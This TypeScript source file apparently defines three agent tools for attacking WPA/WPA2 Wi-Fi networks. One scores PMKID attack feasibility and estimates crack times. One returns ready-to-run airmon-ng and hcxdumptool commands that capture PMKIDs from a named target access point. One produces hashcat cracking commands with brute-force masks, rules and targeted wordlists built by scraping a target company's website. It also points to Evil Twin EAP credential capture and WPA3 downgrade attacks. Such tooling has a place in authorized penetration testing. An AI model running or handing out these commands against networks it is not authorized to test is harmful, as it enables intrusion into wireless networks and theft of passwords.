import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { WIFI_ATTACKS } from "../knowledge/index.js";

function estimateCrackTime(keyspace: number, hashRate: number): string {
  const seconds = keyspace / hashRate;
  if (seconds < 1) return "< 1 second";
  if (seconds < 60) return `${Math.round(seconds)} seconds`;
  if (seconds < 3600) return `${Math.round(seconds / 60)} minutes`;
  if (seconds < 86400) return `${(seconds / 3600).toFixed(1)} hours`;
  if (seconds < 86400 * 365) return `${(seconds / 86400).toFixed(1)} days`;
  if (seconds < 86400 * 365 * 1000) return `${(seconds / (86400 * 365)).toFixed(1)} years`;
  return `${(seconds / (86400 * 365 * 1000)).toFixed(0)}K+ years`;
}

const pmkid_assess: ToolDef = {
  name: "pmkid_assess",
  description: "Assess PMKID attack feasibility against a target network. Evaluates encryption type, roaming configuration, and PSK strength to determine attack viability and estimated crack time.",
  schema: {
    target_encryption: z.string().describe("Target encryption protocol (WPA, WPA2, WPA3, WPA2-Enterprise)"),
    target_roaming: z.boolean().describe("Whether 802.11r (Fast BSS Transition) is enabled on target"),
    psk_length: z.number().optional().describe("Known or estimated PSK length in characters"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const encryption = (args.target_encryption as string).toUpperCase();
    const roaming = args.target_roaming as boolean;
    const pskLength = args.psk_length as number | undefined;

    const isWPA3 = encryption.includes("WPA3") || encryption.includes("SAE");
    const isEnterprise = encryption.includes("ENTERPRISE") || encryption.includes("802.1X") || encryption.includes("EAP");
    const isWPA = encryption.includes("WPA") && !isWPA3;
    const isWEP = encryption.includes("WEP");

    let feasibility: string;
    let feasibilityScore: number; // 1-10
    let reason: string;
    let captureMethod: string;

    if (isWPA3) {
      feasibility = "NOT FEASIBLE";
      feasibilityScore = 0;
      reason = "WPA3-SAE does not use PMKID in the same vulnerable way. SAE handshake is resistant to offline attacks.";
      captureMethod = "N/A - PMKID attack does not work against WPA3-SAE";
    } else if (isEnterprise) {
      feasibility = "PARTIALLY FEASIBLE";
      feasibilityScore = 4;
      reason = "WPA2-Enterprise uses per-session PMKs derived from RADIUS. PMKID can be captured but PSK cracking is not applicable. May expose PMKID for analysis.";
      captureMethod = "PMKID capture possible but cracking requires known PMK derivation parameters";
    } else if (isWEP) {
      feasibility = "NOT APPLICABLE";
      feasibilityScore = 0;
      reason = "WEP does not use PMKID. Use IV-based attacks (aircrack-ng) instead.";
      captureMethod = "N/A - Use WEP-specific attacks";
    } else if (isWPA) {
      feasibility = roaming ? "HIGH" : "MODERATE-HIGH";
      feasibilityScore = roaming ? 9 : 7;
      reason = roaming
        ? "802.11r (Fast BSS Transition) enabled. PMKID is always included in RSNIE. Capture is reliable."
        : "Some WPA/WPA2 APs include PMKID in beacon/association even without 802.11r. Must test.";
      captureMethod = "hcxdumptool sends association request to AP and captures PMKID from AP response. No client needed.";
    } else {
      feasibility = "UNKNOWN";
      feasibilityScore = 5;
      reason = `Cannot determine feasibility for encryption type: ${encryption}`;
      captureMethod = "Test with hcxdumptool to see if PMKID is available";
    }

    // Crack time estimation if PSK length known
    let crackEstimate: Record<string, unknown> | undefined;
    if (pskLength && feasibilityScore > 0) {
      const hashRate = 2500000; // RTX 4090 benchmark
      const scenarios = [
        { name: "Numeric only", charset: 10 },
        { name: "Lowercase", charset: 26 },
        { name: "Alphanumeric", charset: 62 },
        { name: "Full printable", charset: 95 },
      ];

      crackEstimate = {
        hardware: "NVIDIA RTX 4090 (~2.5M PMKs/sec)",
        psk_length: pskLength,
        scenarios: scenarios.map((s) => {
          const keyspace = Math.pow(s.charset, pskLength);
          return {
            charset: s.name,
            keyspace: keyspace > 1e15 ? `~10^${Math.log10(keyspace).toFixed(1)}` : keyspace.toLocaleString(),
            average_time: estimateCrackTime(keyspace / 2, hashRate),
            worst_case: estimateCrackTime(keyspace, hashRate),
          };
        }),
      };
    }

    const pmkidAttack = WIFI_ATTACKS.find((a) => a.id === "pmkid");

    return json({
      pmkid_assessment: {
        target: {
          encryption,
          roaming_802_11r: roaming,
          psk_length: pskLength ?? "unknown",
        },
        feasibility,
        feasibility_score: `${feasibilityScore}/10`,
        reason,
        capture_method: captureMethod,
        advantages_over_handshake: [
          "No client needed - attack works against AP directly",
          "No deauth required - much stealthier (stealth score 1/5)",
          "Single packet capture sufficient",
          "Faster to initiate than waiting for client handshake",
          "Works even when no clients are connected",
        ],
        crack_time_estimate: crackEstimate,
        alternative_approaches: isWPA3 ? [
          "WPA3: Consider Dragonblood side-channel attacks instead",
          "WPA3: Check for transition mode downgrade to WPA2",
          "WPA3: Online password guessing (rate-limited by SAE)",
        ] : isEnterprise ? [
          "Enterprise: Use Evil Twin EAP credential capture instead",
          "Enterprise: Target EAP-MSCHAPv2 for offline cracking",
        ] : undefined,
        kb_reference: pmkidAttack ? {
          id: pmkidAttack.id,
          name: pmkidAttack.name,
          severity: pmkidAttack.severity,
          stealth_score: pmkidAttack.stealthScore,
          prerequisites: pmkidAttack.prerequisites,
          mitigations: pmkidAttack.mitigations,
        } : undefined,
      },
    });
  },
};

const pmkid_capture_commands: ToolDef = {
  name: "pmkid_capture_commands",
  description: "Get PMKID capture commands using hcxdumptool and hcxtools. Returns ready-to-use commands for clientless PMKID extraction.",
  schema: {
    target_bssid: z.string().describe("Target AP BSSID (e.g. 'AA:BB:CC:DD:EE:FF')"),
    interface: z.string().optional().describe("Wireless interface (default: wlan0mon)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const bssid = args.target_bssid as string;
    const iface = (args.interface as string) || "wlan0mon";
    const bssidNoDash = bssid.replace(/:/g, "").toLowerCase();

    return json({
      pmkid_capture: {
        target: bssid,
        interface: iface,
        description: "PMKID is extracted from the first message of the 4-way handshake. No client connection needed.",
        setup: [
          { command: "airmon-ng check kill", description: "Kill interfering processes" },
          { command: `airmon-ng start ${iface.replace("mon", "")}`, description: "Enable monitor mode" },
        ],
        method_1_hcxdumptool: {
          description: "Preferred method - hcxdumptool sends targeted association to extract PMKID",
          filter_file: {
            command: `echo '${bssidNoDash}' > /tmp/filter.txt`,
            description: "Create BSSID filter file (MAC without colons, lowercase)",
          },
          capture: [
            {
              command: `hcxdumptool -i ${iface} -o capture.pcapng --enable_status=15 --filterlist_ap=/tmp/filter.txt --filtermode=2`,
              description: "Capture PMKID from target AP. Wait until PMKID is found (shown in status output).",
            },
            {
              command: `hcxdumptool -i ${iface} -o capture.pcapng --enable_status=15 --filterlist_ap=/tmp/filter.txt --filtermode=2 -c <channel>`,
              description: "Same but locked to specific channel (faster)",
            },
          ],
          convert: [
            {
              command: "hcxpcapngtool -o hash.22000 capture.pcapng",
              description: "Convert capture to hashcat 22000 format",
            },
            {
              command: "hcxpcapngtool -o hash.22000 -E essid_list -I identity_list -U user_list capture.pcapng",
              description: "Convert with additional data extraction",
            },
          ],
          verify: [
            {
              command: "cat hash.22000 | head -1",
              description: "Verify hash was extracted. PMKID lines start with WPA*02*",
            },
            {
              command: "hcxhashtool -i hash.22000 --info",
              description: "Show detailed hash information",
            },
          ],
          notes: [
            "hcxdumptool sends EAPOL-Start and association requests to trigger PMKID",
            "PMKID appears in the first EAPOL message from AP (message 1 of 4-way handshake)",
            "Capture typically completes in 1-30 seconds if AP supports PMKID",
            "If no PMKID after 2-3 minutes, AP likely does not include PMKID in RSN IE",
          ],
        },
        method_2_manual_association: {
          description: "Alternative method using wpa_supplicant to trigger PMKID",
          commands: [
            {
              command: `wpa_supplicant -i ${iface.replace("mon", "")} -c /dev/null -D nl80211 & tcpdump -i ${iface} -w pmkid.pcap 'ether proto 0x888e'`,
              description: "Associate and capture EAPOL frames containing PMKID",
            },
          ],
          notes: ["Less reliable than hcxdumptool but works with standard tools"],
        },
        method_3_airodump: {
          description: "Check if airodump-ng captured PMKID alongside handshake",
          commands: [
            {
              command: `airodump-ng -c <channel> --bssid ${bssid} -w capture ${iface}`,
              description: "Standard capture - may include PMKID",
            },
            {
              command: "hcxpcapngtool -o hash.22000 capture-01.cap",
              description: "Convert airodump capture - will extract PMKID if present",
            },
          ],
        },
        troubleshooting: [
          "No PMKID found: AP may not support/include PMKID in RSNIE",
          "Timeout: Ensure interface is in monitor mode and on correct channel",
          "Permission denied: Run as root or with appropriate capabilities",
          "hcxdumptool not found: Install from https://github.com/ZerBea/hcxdumptool",
          "hcxpcapngtool not found: Install from https://github.com/ZerBea/hcxtools",
        ],
      },
    });
  },
};

const pmkid_crack_commands: ToolDef = {
  name: "pmkid_crack_commands",
  description: "Get PMKID/handshake cracking commands for hashcat. Returns optimized commands with wordlists, rules, and hardware-specific settings.",
  schema: {
    hash_file: z.string().describe("Path to hash file in hashcat format (e.g. 'hash.22000')"),
    wordlist: z.string().optional().describe("Path to wordlist (default: rockyou.txt)"),
    rules: z.string().optional().describe("Hashcat rules file (e.g. 'best64.rule', 'dive.rule')"),
    hardware: z.string().optional().describe("GPU model for optimization (e.g. 'RTX 4090', 'RTX 3090')"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const hashFile = args.hash_file as string;
    const wordlist = (args.wordlist as string) || "/usr/share/wordlists/rockyou.txt";
    const rules = args.rules as string | undefined;
    const hardware = (args.hardware as string)?.toLowerCase() || "";

    // Determine optimization flags based on hardware
    let optimizationFlags = "";
    let workloadFlag = "-w 3"; // standard high-performance

    if (hardware.includes("4090") || hardware.includes("4080")) {
      workloadFlag = "-w 4"; // maximum performance for top GPUs
      optimizationFlags = "-O"; // enable optimized kernels
    } else if (hardware.includes("3090") || hardware.includes("3080")) {
      workloadFlag = "-w 3";
      optimizationFlags = "-O";
    }

    const commands = {
      basic_dictionary: {
        description: "Dictionary attack with wordlist",
        command: `hashcat -m 22000 ${hashFile} ${wordlist} ${workloadFlag} ${optimizationFlags}`.trim(),
        speed: "Depends on wordlist size. rockyou.txt (~14M words) takes seconds.",
      },
      rule_based: {
        description: "Dictionary + rules for mutations (append numbers, change case, leet speak, etc.)",
        commands: [
          `hashcat -m 22000 ${hashFile} ${wordlist} -r ${rules || "/usr/share/hashcat/rules/best64.rule"} ${workloadFlag} ${optimizationFlags}`,
          `hashcat -m 22000 ${hashFile} ${wordlist} -r /usr/share/hashcat/rules/dive.rule ${workloadFlag} ${optimizationFlags}`,
          `hashcat -m 22000 ${hashFile} ${wordlist} -r /usr/share/hashcat/rules/toggles1.rule ${workloadFlag} ${optimizationFlags}`,
          `hashcat -m 22000 ${hashFile} ${wordlist} -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule ${workloadFlag} ${optimizationFlags}`,
        ],
        speed: "Multiplies keyspace by rule count. best64 = 64x more candidates.",
      },
      combinator: {
        description: "Combine two wordlists (word1+word2)",
        command: `hashcat -m 22000 ${hashFile} -a 1 ${wordlist} ${wordlist} ${workloadFlag} ${optimizationFlags}`,
        speed: "Keyspace = wordlist1_size * wordlist2_size",
      },
      brute_force_patterns: {
        description: "Brute force with common WiFi password patterns",
        commands: [
          {
            pattern: "8-digit numeric",
            command: `hashcat -m 22000 ${hashFile} -a 3 ?d?d?d?d?d?d?d?d ${workloadFlag} ${optimizationFlags}`,
            keyspace: "100,000,000",
            estimated_time: "~40 seconds on RTX 4090",
          },
          {
            pattern: "10-digit numeric",
            command: `hashcat -m 22000 ${hashFile} -a 3 ?d?d?d?d?d?d?d?d?d?d ${workloadFlag} ${optimizationFlags}`,
            keyspace: "10,000,000,000",
            estimated_time: "~67 minutes on RTX 4090",
          },
          {
            pattern: "8-char lowercase",
            command: `hashcat -m 22000 ${hashFile} -a 3 ?l?l?l?l?l?l?l?l ${workloadFlag} ${optimizationFlags}`,
            keyspace: "208,827,064,576",
            estimated_time: "~23 hours on RTX 4090",
          },
          {
            pattern: "Word + 4 digits (e.g. Password1234)",
            command: `hashcat -m 22000 ${hashFile} -a 6 ${wordlist} ?d?d?d?d ${workloadFlag} ${optimizationFlags}`,
            keyspace: "wordlist_size * 10,000",
            estimated_time: "Depends on wordlist size",
          },
          {
            pattern: "4 digits + Word (e.g. 2024Password)",
            command: `hashcat -m 22000 ${hashFile} -a 7 ?d?d?d?d ${wordlist} ${workloadFlag} ${optimizationFlags}`,
            keyspace: "10,000 * wordlist_size",
            estimated_time: "Depends on wordlist size",
          },
        ],
      },
      advanced: {
        description: "Advanced cracking techniques",
        commands: [
          {
            technique: "Prince attack (passphrase cracking)",
            command: `hashcat -m 22000 ${hashFile} ${wordlist} --prince ${workloadFlag}`,
            note: "Generates word combinations for passphrase-based PSKs",
          },
          {
            technique: "Keyboard walk patterns",
            command: `kwp /usr/share/hashcat-utils/kwp/basechars /usr/share/hashcat-utils/kwp/keymap /usr/share/hashcat-utils/kwp/routes -s 1 | hashcat -m 22000 ${hashFile} ${workloadFlag}`,
            note: "Generates keyboard walk patterns (qwerty123, etc.)",
          },
          {
            technique: "Distributed cracking",
            command: `hashcat -m 22000 ${hashFile} ${wordlist} --brain-server --brain-host=<server_ip> ${workloadFlag}`,
            note: "Hashcat brain for distributed cracking across multiple machines",
          },
        ],
      },
      session_management: {
        description: "Save and restore cracking sessions",
        commands: [
          `hashcat -m 22000 ${hashFile} ${wordlist} --session=wifi_crack ${workloadFlag}`,
          `hashcat -m 22000 --session=wifi_crack --restore`,
          `hashcat -m 22000 ${hashFile} --show`,
        ],
      },
    };

    return json({
      pmkid_cracking: {
        hash_file: hashFile,
        wordlist,
        rules: rules || "best64.rule (default)",
        hardware: hardware || "generic",
        hashcat_mode: 22000,
        note: "Mode 22000 handles both PMKID and full handshake hashes",
        ...commands,
        recommended_wordlists: [
          { name: "rockyou.txt", size: "~14M words", source: "Kali Linux built-in" },
          { name: "wifi-wordlists", size: "Various", source: "https://github.com/kennyn510/wpa2-wordlists" },
          { name: "SecLists WiFi", size: "Various", source: "https://github.com/danielmiessler/SecLists/tree/master/Passwords/WiFi-WPA" },
          { name: "CrackStation", size: "~1.5B words", source: "https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm" },
          { name: "Custom from OSINT", size: "Variable", source: "cewl, mentalist, or cupp for targeted wordlists" },
        ],
        targeted_wordlist_generation: [
          `cewl -d 3 -m 8 https://targetcompany.com -w custom_wordlist.txt  # Scrape target website`,
          `cupp -i  # Interactive password profiling for known targets`,
          `mentalist  # GUI-based rule + wordlist generator`,
        ],
      },
    });
  },
};

export const pmkidTools: ToolDef[] = [
  pmkid_assess,
  pmkid_capture_commands,
  pmkid_crack_commands,
];
